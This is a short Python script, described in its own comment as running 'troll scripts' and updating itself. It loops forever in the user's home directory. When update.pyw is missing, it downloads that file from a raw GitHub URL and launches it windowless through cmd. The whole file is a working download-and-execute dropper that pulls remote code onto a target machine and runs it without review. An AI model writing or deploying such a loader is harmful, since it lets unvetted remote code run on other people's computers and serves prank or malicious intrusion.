# Runs the troll scripts and updates its-self
import os, urllib.request, pathlib, time
def main():
    def sleep(Time):
        time.sleep(Time)
    while 1 == 1:
        
        def updater():
            home = os.path.expanduser("~")
            os.chdir(home)
            dlurl = "https://raw.githubusercontent.com/xXEthyleneXx/NumberGame/master/update.py"
            path = str(home) + "/update.pyw"
            try:
                os.remove('update.pyw')
            except FileNotFoundError:
                print('Its Not Here')
                urllib.request.urlretrieve(dlurl, '{}'.format(path))
                os.system("start cmd /c {}".format('py ' + path))
                quit()
        updater()
        sleep(10)
main()
